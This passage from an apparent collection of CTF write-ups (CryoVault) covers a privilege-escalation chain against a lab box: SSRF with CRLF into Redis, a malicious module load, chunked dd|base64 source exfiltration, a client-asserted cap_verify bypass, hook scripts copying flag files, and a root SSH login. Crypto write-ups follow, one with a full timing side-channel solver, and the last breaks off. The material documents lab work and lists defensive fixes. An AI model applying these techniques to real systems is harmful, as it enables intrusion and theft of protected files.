      {
        "title": "Finding the User Flag — and a Namespace Boundary",
        "content": "Enumeration found the user flag at:\n\n\n\nBut `cat /home/relay/user.txt` from the `app` context returned `Permission denied`. The file had mode `0640` and appeared owned by UID/GID `65534` (`nobody:nogroup`).\n\nImportant measurements:\n\n\n\nThe restricted UID map explains why other host identities may show up as the overflow UID `65534` when inspected from the `app` process's user namespace. In particular, it would be inaccurate to conclude that the `relay` service's *real* UID was simply `nobody` because of this presentation.\n\nSudo also failed:\n\n\n\nWe did not obtain privilege escalation via `sudo` or Redis itself.",
        "code": "/home/relay/user.txt"
      },
      {
        "title": "Discovering the Privileged Quiet Relay",
        "content": "Process and socket enumeration revealed:\n\n\n\nSystemd configured the relay to run as `User=relay` and `Group=relay`. The command interface used **one JSON object per Unix socket connection**. Simple text probes produced:\n\n\n\nThe binary's error strings contained the decisive clue:",
        "code": "PID 492  /usr/local/sbin/quiet-relay\n/run/quiet-relay/ctrl.sock    srw-rw-rw- (0666)\n/opt/quiet-relay/relay.c      world-readable, 8769 bytes"
      },
      {
        "title": "Pulling source over a truncated command channel",
        "content": "Our RCE output was limited to about 320 bytes per command, and the SSRF preview to 512 bytes. We therefore used a small-chunk transfer to recover the whole `relay.c` source instead of relying on `cat`:\n\n\n\nRepeating this for **55 chunks** and concatenating their Base64-decoded data recovered the exact 8,769-byte source. An initial 256-byte chunk size had failed because Base64 expansion exceeded the module's output limit.\n\nThis was an **exfiltration/transport constraint**, not a failure of the command-execution primitive.",
        "code": "# Executed remotely via QUIET.EXEC, one chunk at a time:\ndd if=/opt/quiet-relay/relay.c bs=160 skip=0 count=1 status=none | base64 -w0"
      },
      {
        "title": "`cap_verify`: Client-Controlled Authorization Bypass",
        "content": "The relevant code in `relay.c`:\n\n\n\nThe code **does not actually check the peer's kernel capabilities**. `cap_verify` is merely a user-supplied JSON boolean. Setting it to `true` makes the entire UID mismatch condition false.\n\nThe handler subsequently:\n\n1. Decodes a Base64 script supplied in the `data` field.\n2. Writes it to `/tmp/hook.<relay_pid>` with executable mode.\n3. Calls `system(\"/tmp/hook.<pid> ...\")` as the relay service account.\n4. Removes the temporary hook.\n\nSource excerpt:\n\n\n\n**Actual privileged request:**\n\n\n\nThis was a classic **trust-boundary violation**: unprivileged client-controlled data was treated as evidence of an operating-system capability.",
        "code": "struct ucred peer = { 0 };\nsocklen_t pl = sizeof(peer);\ngetsockopt(fd, SOL_SOCKET, SO_PEERCRED, &peer, &pl);\n\n/* ... */\n\nif (strcmp(op, \"exec_hook\") == 0) {\n    int cap_verify = json_bool(req, \"cap_verify\");\n    if (!cap_verify && peer.uid != getuid()) {\n        reply(fd, \"{\\\"ok\\\":false,\\\"error\\\":\\\"peer uid mismatch\\\"}\");\n        return;\n    }\n    /* ... executes supplied hook ... */\n}"
      },
      {
        "title": "User flag hook",
        "content": "The hook executed by the relay was:\n\n\n\nWe sent that script through the `QUIET.EXEC` RCE, using Python to connect to `/run/quiet-relay/ctrl.sock` and submit the JSON request. The reproducible companion `quiet_relay_pivot.py` automates this socket request for both flags once the Redis module is loaded. Then `app` read the copy:",
        "code": "#!/bin/sh\n/bin/cat /home/relay/user.txt > /tmp/quiet_user_result.txt\n/bin/chmod 644 /tmp/quiet_user_result.txt"
      },
      {
        "title": "Why did the reply contain `\"exit\":-1`?",
        "content": "`relay.c` installs `signal(SIGCHLD, SIG_IGN)` before calling `system()`. On Linux, ignoring `SIGCHLD` can cause `system()` to return `-1` when it cannot collect the child status, **even if the spawned command produced observable side effects**. We confirmed success using the resulting readable flag file, **not** the reported exit code alone."
      },
      {
        "title": "Root: Linux Capabilities, Not a Root Shell",
        "content": "After retrieving the user flag we checked the relay process's credentials and systemd unit more carefully:\n\n\n\nDecode `CapEff = 0x8000200004`:\n\n| Capability | Bit | Security consequence |\n|---|---:|---|\n| `CAP_DAC_READ_SEARCH` | 2 | Bypass discretionary **read** checks and directory search restrictions |\n| `CAP_SYS_ADMIN` | 21 | Extremely broad privileged administration surface |\n| `CAP_BPF` | 39 | Privileged BPF-related operations |\n\nThe ability to traverse `/root` and read `/root/root.txt` follows directly from **`CAP_DAC_READ_SEARCH`**. Neither `CAP_SYS_ADMIN` nor `CAP_BPF` was needed for this *specific* file-read exploit.\n\nWe reused the same relay socket request but changed the hook to:\n\n\n\nThen, from the existing Redis-based `app` RCE, we read the copied output:\n\n\n\n**Result:** the authentic Root challenge flag was recovered **without proving UID 0 execution through the relay**. Privileged file access due to ambient capabilities was enough.",
        "code": "/proc/492/status:\nUid:      65534 65534 65534 65534    # view from restricted app namespace\nGid:      65534 65534 65534 65534\nCapInh:   0000008000200004\nCapPrm:   0000008000200004\nCapEff:   0000008000200004\nCapBnd:   000000800020000d\nCapAmb:   0000008000200004\nNoNewPrivs: 0"
      },
      {
        "title": "The Maintenance SSH Key and the Decoy",
        "content": "One additional path emerged during reverse engineering. `relay.c` contains an embedded, unused `MAINTENANCE_KEY_ED25519` OpenSSH private key, documented as an out-of-band recovery credential.\n\nThe key was extracted locally from the source's C string literals and validated using `ssh-keygen -y`. Attempts to authenticate as `thm-admin`, `relay`, and `debian` failed. A first set of tests accidentally used Zsh's special `USERNAME` parameter, which silently substituted the attacker's local username; correcting the loop to `ACCOUNT` confirmed those three rejections.\n\nHowever, the key **did** authenticate as `root`:\n\n\n\nThis is an unusual challenge design detail: **a successful root SSH session was not the correct proof for the Root objective**. The contents returned by that path were a decoy. We do not infer the exact mechanism behind the decoy (e.g., a separate mount view or decoy replacement), because we did not verify it. We only report the observed divergence.\n\n**The correct Root flag was the one read using the relay path:**\n\n\n\nThe maintenance private key is intentionally **not reproduced** in this public writeup.",
        "code": "$ ssh -i ./quiet_maintenance.key -o IdentitiesOnly=yes \\\n    -o BatchMode=yes root@10.49.157.44 \\\n    'id; hostname; cat /root/root.txt'\n\nuid=0(root) gid=0(root) groups=0(root)\nip-10-49-157-44\nisfcr{n0t_th15_0ne_k33p_l00k1ng}"
      },
      {
        "title": "Vulnerabilities and Root Causes",
        "content": "| Stage | Failure | Impact |\n|---|---|---|\n| SSRF | URL preview can access loopback TCP services | Internal network access |\n| CRLF | Literal `\\r\\n` reaches a raw protocol request | Cross-protocol Redis commands |\n| Redis local-command policy | Backend SSRF acts as a loopback client | `MODULE LOAD` allowed despite `local` restriction |\n| Attachment upload | Untrusted `.so` written to a path readable by Redis | Module file staging |\n| Redis module | Untrusted native code load permitted | OS command execution as `app` |\n| Relay Unix socket | Permission `0666` with weak logical authorization | Unprivileged callers reach sensitive API |\n| `cap_verify` | Caller-provided boolean bypasses `SO_PEERCRED` without kernel capability verification | Execution as relay account |\n| Ambient capabilities | `CAP_DAC_READ_SEARCH` inherited into hook execution | Read protected user/root files |\n| Embedded private key | SSH recovery key hardcoded in world-readable source | Unauthorized root SSH access, despite challenge decoy |"
      },
      {
        "title": "Defensive fixes",
        "content": "1. **SSRF:** deny loopback, link-local, metadata, and internal ranges *after DNS resolution*; pin validated destinations and avoid raw socket/HTTP request concatenation.\n2. **Protocol handling:** reject control characters and unsupported URL schemes; use a vetted HTTP client rather than synthesizing request lines with raw input.\n3. **Redis:** enforce strict ACLs, disable unnecessary `MODULE` operations, and separate the Redis privilege boundary from the web worker.\n4. **Uploads:** do not place attacker-controlled native binaries in paths executable or loadable by privileged services.\n5. **Relay IPC:** make `SO_PEERCRED` mandatory for privileged actions; do **not** accept a client-asserted boolean as proof of a kernel capability. Restrict socket access appropriately.\n6. **Least privilege:** remove `CAP_DAC_READ_SEARCH`, `CAP_SYS_ADMIN`, and `CAP_BPF` unless strictly necessary; keep hook execution in a sandbox with the minimum required rights.\n7. **Credential hygiene:** remove embedded private keys and rotate any key exposed in code or binaries."
      },
      {
        "title": "Reproduction Checklist",
        "content": "For this particular CTF instance, the confirmed chain is:",
        "code": "[✓] Nmap: TCP/22 SSH, TCP/80 HTTP\n[✓] SSRF via POST /api/report/preview\n[✓] Literal CRLF -> Redis PING/QUIT (+PONG)\n[✓] Redis INFO -> version 7.0.15\n[✓] Redis MODULE LOAD allowed from local request context\n[✓] Upload Redis module .so -> /var/spool/quiet-app/*.so\n[✓] MODULE LOAD -> quietprobe / QUIET.EXEC\n[✓] QUIET.EXEC -> uid=1001(app)\n[✓] Read /opt/quiet-relay/relay.c in 160-byte chunks\n[✓] exec_hook with cap_verify:true bypasses SO_PEERCRED check\n[✓] Relay hook -> read /home/relay/user.txt [USER]\n[✓] Relay has CAP_DAC_READ_SEARCH\n[✓] Relay hook -> read real root flag [ROOT]\n[✓] Root SSH maintenance key tested -> decoy, not final root flag"
      },
      {
        "title": "Final Flags",
        "content": "---\n\n**Takeaway:** The most interesting part of QUIET was not Redis itself. It was the series of **individually weak trust decisions**: a local-only API accessible through a newline-injectable SSRF, untrusted uploaded native code loaded into Redis, a user-asserted capability flag controlling Unix-socket authorization, and a service granted enough ambient privileges to read files it was never supposed to expose. The decoy root SSH route made the exact exploitation path matter as much as the privilege level.\n\n*Written from the commands, outputs, source code, and verified flags observed during the ISFCR CryoVault 2026 TryHackMe lab. All exploitation described here was performed against the challenge instance.*",
        "code": "USER: isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}\nROOT: isfcr{r00ted_by_r3n4m1ng_0bjdump}"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-crypto-brine",
    "title": "BRINE THERMOCLINE",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "The SHARD-24 brine loop keeps the vault's outer jacket at -42 C. Its sounding head, a\nKestrel CT-9 thermocline sounder, holds the loop's calibration profile in a sealed\ntable and will not release the profile to anyone, including us. We need it: the\nvault's cryo-recovery bundle was sealed against that profile before the head was\npotted.",
    "problemDescription": "The SHARD-24 brine loop keeps the vault's outer jacket at -42 C. Its sounding head, a\nKestrel CT-9 thermocline sounder, holds the loop's calibration profile in a sealed\ntable and will not release the profile to anyone, including us. We need it: the\nvault's cryo-recovery bundle was sealed against that profile before the head was\npotted.",
    "tools": [],
    "analysis": "The SHARD-24 brine loop keeps the vault's outer jacket at -42 C. Its sounding head, a\nKestrel CT-9 thermocline sounder, holds the loop's calibration profile in a sealed\ntable and will not release the profile to anyone, including us. We need it: the\nvault's cryo-recovery bundle was sealed against that profile before the head was\npotted.",
    "solution": [
      {
        "title": "Your head",
        "content": "nc <host> <port>\n\nEvery team shares this service; a session is a head of your own. Line-delimited JSON,\none object per line each way. The first line on every connection is one of\n\n    -> {\"cmd\":\"SESSION\"}\n    <- {\"ok\":true,\"token\":\"<22 chars>\"}\n\n    -> {\"cmd\":\"RESUME\",\"token\":\"<22 chars>\"}\n    <- {\"ok\":true}\n\n`SESSION` provisions a new head and binds the connection to it; `RESUME` binds a later\nconnection to the head you already have. Keep the token: it is the only way back to\nthat head. A new session is a new head, with its own device key, profile and bundle. A\nsession unused for 3 hours expires, and a service restart ends every session.\n\n    -> {\"cmd\":\"HELLO\"}\n    <- {\"ok\":true,\"instance_id\":\"<32 hex>\",\"firmware\":\"CT-9 v2.5.3\",\"t\":<int>,\n        \"session_key\":\"<64 hex>\"}\n\n    -> {\"cmd\":\"SOUND\",\"t\":<int>,\"w\":<uint32>,\"reps\":<1..2048>,\"tag\":\"<32 hex>\"}\n    <- {\"ok\":true,\"t\":<int+1>,\"deltas\":[<ns>, ... reps of them]}\n\n    -> {\"cmd\":\"BUNDLE\"}\n    <- {\"ok\":true,\"sealed\":\"<hex>\",\"note\":\"...\"}\n\n`t` is the head's round counter: a `SOUND` must carry its current value, which `HELLO`\nreports. `tag` is FROSTWRAP-24 over `instance_id || t || w || reps` under `session_key`\n(`src/ct9_auth.py`). Errors: `ESEQ` (wrong `t`; the reply carries the current one),\n`ETAG`, `EARG` (malformed request, or a line over 4096 bytes), `ESESSION` (no session on\nthis connection, or the token is not a live session), `EBUSY` (too many open connections\nor new sessions; the connection is closed, retry shortly), `EINT` (internal fault;\nplease report it). An error reply does not advance `t`.\n\nSoundings are limited to 20 per second per head, shared by every connection to it. A\nconnection idle for 10 minutes is closed, and when the head is at its connection limit\nthe connection idle longest may be closed to admit a new one; reconnect, `RESUME` and\ncarry on.\n\n`BUNDLE` returns your head's AES-256-GCM recovery bundle: 12-byte nonce, ciphertext,\n16-byte tag. The key is `SHA256(b\"BRINE-SEAL-v2\" + sigma_1||...||sigma_32)`, the\nsetpoints in ascending order, each a big-endian uint32. Every head has its own device\nkey and therefore its own profile."
      },
      {
        "title": "Firmware",
        "content": "Field heads run CT-9 2.5.3. Kestrel has not released 2.5 source to integrators. `src/`\nis the most recent drop we have, 2.4.1, with its changelog; `docs/` holds the SDK's\nengineering notes and a vendor advisory. `brine_sim.py` runs a 2.4.1 head locally\n(`python3 brine_sim.py --help`); it accepts `SESSION` and `RESUME` and ignores them."
      },
      {
        "title": "A 2.4.1 session",
        "content": "Captured by Kestrel from a 2.4.1 test head; `python3 brine_sim.py --selftest` replays it.\n\n    -> {\"cmd\":\"HELLO\"}\n    <- {\"ok\":true,\"instance_id\":\"f22d048ad214c29207ca24a853c0dc8f\",\"firmware\":\"CT-9 v2.4.1\",\"t\":0,\"session_key\":\"1ff2b5dd851d070a811d3155f28ba966ebbd1f0e0a233c1d2304b0491f75fa3a\"}\n\n    -> {\"cmd\":\"SOUND\",\"t\":0,\"w\":853462973,\"reps\":12,\"tag\":\"d55278a1292d5f633c824a740d35cd64\"}\n    <- {\"ok\":true,\"t\":1,\"deltas\":[48000,48000,48000,48000,48000,48000,48000,48000,48000,48480,60720,48000]}\n\n    -> {\"cmd\":\"SOUND\",\"t\":1,\"w\":3978599269,\"reps\":4,\"tag\":\"7e5f99ddb213097b78c206ff69b18c47\"}\n    <- {\"ok\":true,\"t\":2,\"deltas\":[48000,48000,48000,48000]}\n\n    -> {\"cmd\":\"SOUND\",\"t\":2,\"w\":335460141,\"reps\":4,\"tag\":\"0af72c5c483def78c500e8cb9cb24578\"}\n    <- {\"ok\":true,\"t\":3,\"deltas\":[48000,60000,72000,60000]}"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"BRINE THERMOCLINE: recover the hidden 32 x uint32 profile via gallop timing.\n\nWorks against remote CT-9 protocol and bundled 2.4.1 simulator.\nOnly accesses the CTF endpoint explicitly supplied on command line.\n\"\"\"\nimport argparse\nimport hashlib\nimport json\nimport math\nimport os\nfrom pathlib import Path\nimport socket\nimport subprocess\nimport sys\nimport time\n\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\nHERE = Path(__file__).resolve().parent\nU32 = (1 << 32) - 1\nBASE = 48000\nCAV = 12000\nP_CAV = 24 / 256\n\nclass Head:\n    def __init__(self, host, port, simulator=None, seed=None, rate=19.0):\n        self.host, self.port = host, port\n        self.simulator, self.seed = simulator, seed\n        self.rate = rate\n        self.last_sound = 0.0\n        self.conn = self.stream = self.proc = None\n        self.seq = 0\n        self.instance = self.session_key = None\n        self.token = None\n        self.total = 0\n\n    def connect(self):\n        if self.simulator:\n            cmd = [sys.executable, '-u', str(HERE / 'brine_sim.py'), '--seed', str(self.seed)]\n            self.proc = subprocess.Popen(cmd, stdin=subprocess.PIPE,\n                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                                         bufsize=0)\n            self.stream = self.proc.stdout\n            self.writer = self.proc.stdin\n        else:\n            self.conn = socket.create_connection((self.host, self.port), timeout=30)\n            self.conn.settimeout(120)\n            self.stream = self.conn.makefile('rb')\n            self.writer = self.conn.makefile('wb')\n\n    def command(self, **kw):\n        line = json.dumps(kw, separators=(',', ':')).encode() + b'\\n'\n        self.writer.write(line)\n        self.writer.flush()\n        resp = self.stream.readline()\n        if not resp:\n            raise ConnectionError('server closed connection')\n        try:\n            obj = json.loads(resp)\n        except Exception:\n            raise ValueError('Bad response: ' + repr(resp[:150]))\n        return obj\n\n    def start(self, token=None):\n        self.connect()\n        if token:\n            r = self.command(cmd='RESUME', token=token)\n            if not r.get('ok'):\n                raise RuntimeError('RESUME failed (expired session?): ' + str(r))\n            self.token = token\n        else:\n            r = self.command(cmd='SESSION')\n            if not r.get('ok'):\n                raise RuntimeError('SESSION failed: ' + str(r))\n            self.token = r['token']\n        r = self.command(cmd='HELLO')\n        if not r.get('ok'):\n            raise RuntimeError('HELLO failed: ' + str(r))\n        self.seq = r['t']\n        self.instance = bytes.fromhex(r['instance_id'])\n        self.session_key = bytes.fromhex(r['session_key'])\n        print(f'[+] firmware={r[\"firmware\"]} t={self.seq} instance={r[\"instance_id\"]}', flush=True)\n\n    def sound(self, w, reps):\n        from src.ct9_auth import tag\n        if not self.simulator:\n            delay = 1.0 / self.rate - (time.monotonic() - self.last_sound)\n            if delay > 0:\n                time.sleep(delay)\n        self.last_sound = time.monotonic()\n        t = self.seq\n        mac = tag(self.session_key, self.instance, t, w, reps)\n        r = self.command(cmd='SOUND', t=t, w=w, reps=reps, tag=mac)\n        if not r.get('ok'):\n            if r.get('err') == 'ESEQ':\n                self.seq = int(r['t'])\n            raise RuntimeError(f'SOUND t={t} w={w} reps={reps}: {r}')\n        self.seq = r['t']\n        self.total += 1\n        ds = r.get('deltas', [])\n        if len(ds) != reps:\n            raise RuntimeError('Invalid response length ' + str(len(ds)))\n        return ds\n\n    def bundle(self):\n        r = self.command(cmd='BUNDLE')\n        if not r.get('ok'):\n            raise RuntimeError('BUNDLE failed: ' + str(r))\n        return r\n\n    def close(self):\n        try:\n            if self.conn:\n                self.conn.close()\n            if self.proc:\n                self.proc.terminate()\n        except Exception:\n            pass\n\n\ndef cav_count(ds):\n    # CT-9 2.4.x: 12us per cavitation; 240ns jitter most often zero.\n    # Dividing by 12us and rounding removes the small independent jitter.\n    return sum(max(0, (int(delta) - BASE + CAV//2) // CAV) for delta in ds)\n\n\ndef log_lr(count, n, p):\n    \"\"\"log Pr[count|steps=2] / Pr[count|steps=1].\"\"\"\n    if count > n:\n        return 1000.0\n    return (math.lgamma(2*n+1)-math.lgamma(2*n-count+1)\n            -math.lgamma(n+1)+math.lgamma(n-count+1)\n            + n*math.log1p(-p))\n\n\nclass Oracle:\n    def __init__(self, head, p=P_CAV, cutoff=20.0, first=256, max_repeats=8):\n        self.head, self.p, self.cutoff = head, p, cutoff\n        self.first, self.max_repeats = first, max_repeats\n        self.queries, self.uncertain = 0, 0\n\n    def evaluate(self, anchor, w):\n        \"\"\"True iff gallop_steps(rank(anchor), rank(w)) >= 2.\n\n        The caller must ensure w is not below anchor in rank, so this is\n        equivalent to rank(w) >= rank(anchor) + 2.\n        \"\"\"\n        llr = 0.0\n        reps = self.first\n        self.queries += 1\n        for attempt in range(self.max_repeats):\n            self.head.sound(anchor, 1)        # reset finger to known rank\n            ds = self.head.sound(w, reps)\n            c = cav_count(ds)\n            llr += log_lr(c, reps, self.p)\n            if abs(llr) >= self.cutoff:\n                return llr > 0\n            self.uncertain += 1\n            reps = min(reps * 2, 2048)\n        raise RuntimeError(f'Unable to classify query anchor={anchor} w={w} llr={llr:.3f}')\n\n    def calibrate(self):\n        print('[*] Calibrating gallop leakage...', flush=True)\n        # Known rank 0 at w=0 and rank 32 at w=U32.\n        self.head.sound(0, 1)\n        ones = self.head.sound(0, 2048)\n        self.head.sound(0, 1)\n        sixes = self.head.sound(U32, 2048)\n        m1 = cav_count(ones)/len(ones)\n        m6 = cav_count(sixes)/len(sixes)\n        print(f'[*] Cavitations/pass: step=1 {m1:.4f}, step=6 {m6:.4f}; expected ~{P_CAV:.4f}/{6*P_CAV:.4f}', flush=True)\n        if m1 < 0.025 or m6 < m1 * 2.5:\n            raise RuntimeError('No recognizable 2.4.x gallop signal. CT-9 2.5.x may use different timings; do not trust recovery.')\n        # Use two estimators, weighted by total Bernoulli trials.\n        self.p = max(0.01, min(0.3, (cav_count(ones) + cav_count(sixes)) / (2048 * 7)))\n        print(f'[*] Estimated cavitation p={self.p:.5f}', flush=True)\n\n\ndef lower_bound(lo, hi, predicate):\n    \"\"\"Smallest w in [lo,hi] satisfying a monotone predicate.\"\"\"\n    while lo < hi:\n        mid = (lo + hi)//2\n        if predicate(mid):\n            hi = mid\n        else:\n            lo = mid + 1\n    return lo\n\n\ndef seal(profile, bundle):\n    material = b'BRINE-SEAL-v2' + b''.join(s.to_bytes(4,'big') for s in profile)\n    key = hashlib.sha256(material).digest()\n    nonce = bytes.fromhex(bundle['sealed'][:24])\n    ct_tag = bytes.fromhex(bundle['sealed'][24:])\n    if len(ct_tag) < 16:\n        raise RuntimeError('Sealed bundle too short')\n    ct, mac = ct_tag[:-16], ct_tag[-16:]\n    return AESGCM(key).decrypt(nonce, ct + mac, None)\n\n\ndef main():\n    pa = argparse.ArgumentParser()\n    pa.add_argument('host', nargs='?', default='0.cloud.chals.io')\n    pa.add_argument('port', nargs='?', type=int, default=12312)\n    pa.add_argument('--sim', action='store_true', help='Use bundled 2.4.1 simulator')\n    pa.add_argument('--seed', type=int, default=1)\n    pa.add_argument('--new', action='store_true', help='Force new session')\n    pa.add_argument('--limit', type=int, default=32, help='Recover first N setpoints (testing)')\n    pa.add_argument('--rate', type=float, default=18.0)\n    pa.add_argument('--first', type=int, default=256)\n    pa.add_argument('--confidence', type=float, default=20.0)\n    a = pa.parse_args()\n    state_path = HERE / 'brine_session.json'\n    state = {}\n    if not a.sim and not a.new and state_path.exists():\n        state = json.loads(state_path.read_text())\n    if a.new and state_path.exists():\n        state_path.unlink()\n    head = Head(a.host, a.port, simulator=a.sim, seed=a.seed, rate=a.rate)\n    try:\n        head.start(token=state.get('token'))\n        if not a.sim:\n            if not state or state.get('instance') != head.instance.hex():\n                state = {'token':head.token,'instance':head.instance.hex(),'profile':{}}\n                state_path.write_text(json.dumps(state, indent=2))\n                os.chmod(state_path, 0o600)\n                print(f'[+] Saved resume token to {state_path}', flush=True)\n        oracle = Oracle(head, first=a.first, cutoff=a.confidence)\n        oracle.calibrate()\n        sigma = {int(k):int(v) for k,v in state.get('profile',{}).items()}\n        if 2 not in sigma:\n            # Anchor rank zero. Transition from step1 to step2 at sigma_2.\n            sigma[2] = lower_bound(1,U32,lambda w:oracle.evaluate(0,w))\n            print(f'[+] sigma[02]={sigma[2]}', flush=True)\n            if not a.sim:\n                state['profile'] = {str(k):v for k,v in sigma.items()}\n                state_path.write_text(json.dumps(state,indent=2))\n        if 1 not in sigma:\n            # Anchor rank 2, possible target rank 0/1; step2 iff rank0.\n            # Find first w where the answer flips to step1.\n            sigma[1] = lower_bound(1,sigma[2]-1,lambda w:not oracle.evaluate(sigma[2],w))\n            print(f'[+] sigma[01]={sigma[1]}', flush=True)\n            if not a.sim:\n                state['profile'] = {str(k):v for k,v in sigma.items()}\n                state_path.write_text(json.dumps(state,indent=2))\n        for k in range(3, min(32,a.limit)+1):\n            if k in sigma:\n                continue\n            # anchor=sigma[k-1]-1 has rank k-2, so step2 iff rank(w)>=k.\n            anchor = sigma[k-1] - 1\n            sigma[k] = lower_bound(sigma[k-1]+1,U32,lambda w:oracle.evaluate(anchor,w))\n            print(f'[+] sigma[{k:02}]={sigma[k]}  soundings={head.total}  ambiguous={oracle.uncertain}', flush=True)\n            if not a.sim:\n                state['profile'] = {str(j):v for j,v in sigma.items()}\n                state_path.write_text(json.dumps(state,indent=2))\n        if a.limit < 32:\n            print('[*] Partial profile (requested --limit).')\n            return\n        profile = [sigma[i] for i in range(1,33)]\n        assert profile == sorted(profile) and len(set(profile)) == 32\n        print(f'[+] Recovered all 32 setpoints from {head.total} SOUND requests.',flush=True)\n        print('[+] profile=',profile,flush=True)\n        if a.sim:\n            real = subprocess.check_output([sys.executable,str(HERE/'brine_sim.py'),'--seed',str(a.seed),'--show'])\n            expected = [int(i) for i in real.split()]\n            print('[+] SIMULATOR VALID:',profile == expected,flush=True)\n            if profile != expected:\n                raise RuntimeError('Bad profile vs simulator!')\n            return\n        bundle = head.bundle()\n        (HERE/'bundle.json').write_text(json.dumps(bundle,indent=2))\n        # Try the documented 12-byte nonce + ciphertext + 16-byte tag framing.\n        try:\n            pt = seal(profile,bundle)\n        except Exception as e:\n            print('[!] Recovered profile, but bundle verification failed:',repr(e),flush=True)\n            print('[!] Raw BUNDLE:',bundle,flush=True)\n            raise\n        print('\\n[+] AES-GCM authentication: VALID', flush=True)\n        print('[+] Decrypted bundle:',repr(pt),flush=True)\n        try:\n            print(pt.decode('utf-8'))\n        except UnicodeDecodeError:\n            pass\n    finally:\n        head.close()\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-crypto-half-truths",
    "title": "Half-Truths — Crypto CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Half-Truths — Crypto CTF",
    "problemDescription": "Flag: `isfcr{l1st_d3c0d1ng_p4st_th3_r4d1us}`\n\n512 share Shamir dibuat dari satu polinom rahasia derajat 39 di GF(2^31-1). Sebanyak 327 share diganti dengan nilai acak, sehingga hanya 185 share yang benar. Berlekamp–Welch/unique decoding gagal karena memerlukan setidaknya `(512+40)/2 = 276` share benar. Sudan *list decoding* berhasil: dengan 185 share benar, polinom asli dapat ditemukan sebagai faktor dari polinom interpolasi bivariat.",
    "tools": [],
    "analysis": "Parameter:\n\n```\np = 2147483647\nk = 40              # deg(f) <= 39\nn = 512\nt = 185             # exactly 185 correct shares\nerrors = 327\n```\n\nKunci AES dibangun langsung dari koefisien polinom rahasia:\n\n```python\nkey = sha256((\",\".join(map(str, coeffs))).encode()).digest()\n```\n\n`coeffs` diurutkan dari derajat terendah ke tertinggi, tanpa spasi tambahan. Nonce AES-GCM adalah string byte `half-truths-`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `chall.py` (source tercantum pada teks dari user, tidak didistribusikan sebagai file asli): membangkitkan 40 koefisien acak, mengacak 512 share, menyisakan 185 share benar, mengenkripsi flag via AES-GCM.\n- `output.json`: semua 512 share, prime, parameter, nonce, ciphertext, authentication tag. Disalin dari output yang diberikan dalam teks challenge.\n- `solve.py`: script solusi lengkap tanpa mengetahui posisi share benar atau hardcode flag."
      },
      {
        "title": "List decoding: Interpolasi Sudan",
        "content": "Bangun polinom bivariat\n\n\\[\nQ(X,Y)=\\sum_{i+39j\\leq 180}q_{ij}X^iY^j\n\\]\n\ndi GF(p), dan paksakan `Q(x_i,y_i)=0` untuk semua 512 titik, benar maupun palsu. Banyak monomial (variabel tak diketahui) adalah\n\n\\[\n\\sum_{j=0}^{4}(181-39j) = 515.\n\\]\n\nAda 512 persamaan homogen untuk 515 koefisien, maka selalu ada solusi nonnol. Pada data ini rank matriks adalah 508, sehingga ditemukan nullspace 7-dimensi.\n\nKarena untuk 185 share jujur `y_i=f(x_i)`, maka polinom satu variabel `Q(X,f(X))` memiliki 185 akar berbeda, sementara derajatnya paling tinggi 180. Oleh karena itu `Q(X,f(X))` harus identik nol, sehingga `Y-f(X)` adalah faktor dari `Q(X,Y)`.\n\nAlasan ini tidak membutuhkan pengetahuan tentang indeks 185 share jujur, dan tidak menggunakan asumsi bahwa share salah berdekatan atau mudah dikenali."
      },
      {
        "title": "Recover polynomial f",
        "content": "1. Ambil satu basis polinom `Q` dari nullspace hasil eliminasi modular.\n2. Faktorkan `Q(0,Y)` di GF(p). Karena `Y-f(X)` membagi `Q(X,Y)`, maka `f(0)` adalah salah satu akar `Q(0,Y)`.\n3. Untuk tiap akar sederhana `a_0`, lakukan *power series / Hensel lifting*: cari `a_1, a_2, ... a_39` agar `Q(X,a_0+a_1X+...+a_39X^39) == 0 mod X^40`.\n4. Jika turunan `Q_Y(0,a_0)` bukan nol, setiap koefisien berikutnya memiliki solusi unik:\n\n\\[\na_i = - \\frac{[X^i]Q(X,\\sum_{j=0}^{i-1}a_jX^j)}{Q_Y(0,a_0)}\\pmod p.\n\\]\n\n5. Evaluasi tiap kandidat pada semua 512 share dan pilih hanya yang cocok pada **185** share persis.\n6. Bentuk AES key dari 40 koefisien, lalu decrypt AES-GCM beserta authentication tag. Tag sukses memvalidasi koefisien dengan bukti kriptografis tambahan.\n\nPada instance ini, `Q(0,Y)` punya empat akar kandidat. Tiga kandidat pertama menghasilkan nol share cocok; kandidat keempat cocok dengan tepat 185 share."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "Dependensi:\n\n\n\nJalankan di direktori ini:\n\n\n\nHasil akhir:",
        "code": "python3 -m pip install numpy sympy cryptography"
      },
      {
        "title": "Catatan",
        "content": "- Bukan rekonstruksi dengan memilih 40 share secara acak (peluang semuanya jujur terlalu kecil).\n- Bukan unique decoding klasik; ambang 276 memang sengaja dilampaui.\n- Sertifikat validitas: 185 share persis sesuai f **dan** AES-GCM tag diterima."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
